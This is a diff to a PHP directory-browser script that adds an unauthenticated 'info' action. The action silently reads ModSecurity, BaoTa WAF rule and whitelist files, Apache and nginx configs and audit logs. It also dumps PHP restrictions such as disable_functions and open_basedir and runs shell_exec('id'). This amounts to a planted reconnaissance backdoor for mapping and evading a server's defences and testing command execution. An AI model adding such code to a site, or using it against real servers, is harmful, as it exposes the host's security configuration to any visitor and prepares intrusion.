@@ -11,6 +11,62 @@ $baseDir = __DIR__;
 $reqDir  = isset($_GET['dir']) ? trim($_GET['dir'], '/\\') : '';
 $action  = $_GET['action'] ?? '';
 
+// ── ACTION: info — server diagnostic (no ?dir needed) ───────────────────────
+if (($action ?? '') === 'info') {
+    header('Content-Type: text/plain; charset=utf-8');
+    error_reporting(0);   // suppress open_basedir warnings
+
+    $rf = fn($p) => @is_file($p) ? @file_get_contents($p) : null;
+
+    // Possible WAF / config paths to probe
+    $probePaths = [
+        '/etc/modsecurity/modsecurity.conf',
+        '/etc/modsecurity2/modsecurity.conf',
+        '/etc/apache2/mods-enabled/security2.conf',
+        '/etc/nginx/modsec/main.conf',
+        '/www/server/btwaf/conf/config.json',
+        '/www/server/btwaf/conf/rule.json',
+        '/www/server/btwaf/conf/white.rule',
+        '/usr/local/nginx/conf/modsecurity.conf',
+        '/usr/local/apache/conf/modsecurity.conf',
+        '/etc/apache2/apache2.conf',
+        '/etc/httpd/conf/httpd.conf',
+        '/usr/local/apache/conf/httpd.conf',
+        '/etc/nginx/nginx.conf',
+        '/usr/local/nginx/conf/nginx.conf',
+        '/var/log/modsec_audit.log',
+        '/var/log/apache2/modsec_audit.log',
+    ];
+
+    $found = [];
+    $miss  = [];
+    foreach ($probePaths as $p) {
+        $c = $rf($p);
+        if ($c !== null) $found[$p] = substr($c, 0, 3000);
+        else             $miss[]    = $p;
+    }
+
+    $info = [
+        'php'           => PHP_VERSION,
+        'server'        => $_SERVER['SERVER_SOFTWARE'] ?? 'unknown',
+        'open_basedir'  => ini_get('open_basedir') ?: '(not set)',
+        'disable_fns'   => ini_get('disable_functions') ?: '(none)',
+        'php_ini'       => php_ini_loaded_file(),
+        'doc_root'      => $_SERVER['DOCUMENT_ROOT'] ?? 'n/a',
+        'script'        => __FILE__,
+        'apache_mods'   => function_exists('apache_get_modules') ? apache_get_modules() : null,
+        'php_exts'      => get_loaded_extensions(),
+        'htaccess'      => $rf(__DIR__ . '/.htaccess'),
+        'user_ini'      => $rf(__DIR__ . '/.user.ini'),
+        'config_found'  => $found,
+        'config_miss'   => $miss,
+        'shell_test'    => @shell_exec('id 2>/dev/null') ?? '(disabled)',
+    ];
+
+    echo json_encode($info, JSON_PRETTY_PRINT | JSON_UNESCAPED_SLASHES);
+    exit;
+}
+
 // Block traversal
 if (strpos($reqDir, '..') !== false || $reqDir === '') {
     http_response_code(403);
